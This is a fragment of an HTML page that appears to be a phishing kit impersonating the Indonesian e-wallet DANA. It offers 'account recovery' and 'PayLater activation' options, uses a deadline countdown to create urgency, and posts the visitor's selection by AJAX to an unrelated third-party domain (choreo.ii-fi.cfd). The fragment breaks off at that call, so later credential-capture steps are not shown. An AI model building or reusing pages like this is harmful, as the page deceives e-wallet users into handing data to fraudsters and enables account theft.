...
<div style="padding: 15px;  margin-top: 160px;">
 ...
 <label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAXdjxnqzQrt4iAYg783g99sWPOqRqJYklp84UOSymSnTPrK7jeeb29BBVtNHX70iz97TvnW4-2p49wXN2b1UVxl7o0R0RiGejUyuLzXvliVy_YovSo8U9IJYSqIcIW_gNl2MqAlTMZD2WnT9TcLVrQv9L33QLC-N0buMsnhBx06WZWzvhEUHg5vV_D48/s992/AddText_11-13-06.56.18.jpg);background-position: 100% 100%;background-size: 100% 100%;">
    <input type="radio" name="tarif" class="btn-puna" onclick="letsgo()" value="𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔"><h3 style="font-weight: bold; margin-top: 15px;margin-left:-5px">#𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔</h3><br><h style="opacity: 0.7; color: #118eea">𝘒𝘢𝘮𝘪 𝘚𝘪𝘢𝘱 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘔𝘦𝘮𝘶𝘭𝘪𝘩𝘬𝘢𝘯 𝘈𝘬𝘶𝘯 𝘋𝘈𝘕𝘈 𝘒𝘢𝘮𝘶</h>
  </label>
  ...
  <label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEju8031bBO1hZpctSkIVmSPlr6r75dU_-KBBuJKqQkDV9Ihw5LaaJvFZqEfYOQMpcf6CR0dkZlXwfSjmIIlFYXDfPr6SxWO5WmklB_KYW4maz1J-Las4WyEsbmd9Uhw19aElW-pqQ7RLx93Dm0Qy5olUDmEXzyeoTqPyacIRXsn2jcLBmbGlEfL-LQhAdk/s992/AddText_11-21-08.27.51.jpg);background-position: 100% 100%;background-size: 100% 100%;">
   <input type="radio" name="tarif" class="btn-punya" onclick="letsgo()" value="𝗔𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿"><h3 style="font-weight: bold; margin-top: 15px;margin-left:-5px">#𝗔𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</h3><br><h style="opacity: 0.7; color: #118eea">𝘈𝘥𝘢 𝘒𝘦𝘣𝘶𝘵𝘶𝘩𝘢𝘯 𝘔𝘦𝘯𝘥𝘦𝘴𝘢𝘬?
𝘠𝘶𝘬 <br>𝘈𝘬𝘵𝘪𝘧𝘬𝘢𝘯 𝘗𝘢𝘺𝘭𝘢𝘵𝘦𝘳𝘯𝘺𝘢.</h>
</label> 
...
<!-- partial -->
  <script>
let tglNow = new Date();
let waktuBatas = new Date("2025-05-12T23:59:59");
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/d0sd/ii/tarif.php',
